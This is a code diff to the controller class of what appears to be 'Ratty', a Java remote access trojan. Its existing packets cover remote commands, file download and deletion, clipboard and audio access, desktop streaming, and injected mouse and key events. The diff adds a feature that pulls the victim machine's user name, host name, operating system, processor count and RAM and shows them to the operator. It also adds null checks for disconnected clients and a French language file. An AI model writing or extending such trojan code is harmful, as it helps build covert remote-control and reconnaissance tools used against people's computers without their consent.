@@ -27,6 +27,7 @@ import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
+import de.sogomn.rat.packet.ComputerInfoPacket;
 import de.sogomn.rat.packet.DeleteFilePacket;
 import de.sogomn.rat.packet.DesktopPacket;
 import de.sogomn.rat.packet.DownloadFilePacket;
@@ -81,7 +82,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"language/lang_dk.properties",
 		"language/lang_it.properties",
 		"language/lang_sv.properties",
-		"language/lang_pt.properties"
+		"language/lang_pt.properties",
+		"language/lang_fr.properties"
 	};
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
@@ -104,6 +106,12 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String FILE_LAST_ACCESS = LANGUAGE.getString("file_information.last_access");
 	private static final String FILE_LAST_MODIFICATION = LANGUAGE.getString("file_information.last_modification");
 	private static final String FILE_BYTES = LANGUAGE.getString("file_information.bytes");
+	private static final String USER_NAME = LANGUAGE.getString("information.user_name");
+	private static final String HOST_NAME = LANGUAGE.getString("information.host_name");
+	private static final String OS_NAME = LANGUAGE.getString("information.os_name");
+	private static final String OS_ARCHITECTURE = LANGUAGE.getString("information.os_architecture");
+	private static final String PROCESSORS = LANGUAGE.getString("information.processors");
+	private static final String RAM = LANGUAGE.getString("information.ram");
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
 	private static final long PING_INTERVAL = 3000;
@@ -480,6 +488,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createChatPacket(client);
 		} else if (command == FileTree.INFORMATION) {
 			packet = createFileInformationPacket(client);
+		} else if (command == RattyGui.INFORMATION) {
+			packet = new ComputerInfoPacket();
 		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastMouseEventPacket();
 		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
@@ -584,6 +594,28 @@ public final class RattyGuiController extends AbstractRattyController implements
 		gui.showMessage(message);
 	}
 	
+	private void handleInfoPacket(final ComputerInfoPacket packet) {
+		final String name = packet.getName();
+		final String hostName = packet.getHostName();
+		final String os = packet.getOs();
+		final String osVersion = packet.getOsVersion();
+		final String osArchitecture = packet.getOsArchitecture();
+		final int processors = packet.getProcessors();
+		final long ram = packet.getRam();
+		final StringBuilder builder = new StringBuilder();
+		
+		final String message = builder
+				.append(USER_NAME).append(": ").append(name).append("\r\n")
+				.append(HOST_NAME).append(": ").append(hostName).append("\r\n")
+				.append(OS_NAME).append(": ").append(os).append(" ").append(osVersion).append("\r\n")
+				.append(OS_ARCHITECTURE).append(": ").append(osArchitecture).append("\r\n")
+				.append(PROCESSORS).append(": ").append(processors).append("\r\n")
+				.append(RAM).append(": ").append(ram).append(" ").append(FILE_BYTES).append("\r\n")
+				.toString();
+		
+		gui.showMessage(message);
+	}
+	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
 		final Class<? extends IPacket> clazz = packet.getClass();
 		
@@ -617,6 +649,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 			final ChatPacket chat = (ChatPacket)packet;
 			
 			handleChatPacket(client, chat);
+		} else if (clazz == ComputerInfoPacket.class) {
+			final ComputerInfoPacket info = (ComputerInfoPacket)packet;
+			
+			handleInfoPacket(info);
 		} else if (clazz == FileInformationPacket.class) {
 			final FileInformationPacket information = (FileInformationPacket)packet;
 			
@@ -670,6 +706,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 	@Override
 	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
 		final ServerClient client = getClient(connection);
+		
+		if (client == null) {
+			return;
+		}
+		
 		final boolean loggedIn = client.isLoggedIn();
 		
 		if (loggedIn) {
@@ -699,6 +740,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 		super.disconnected(connection);
 		
 		final ServerClient client = getClient(connection);
+		
+		if (client == null) {
+			return;
+		}
 		
 		gui.removeClient(client);
 		clients.remove(connection);
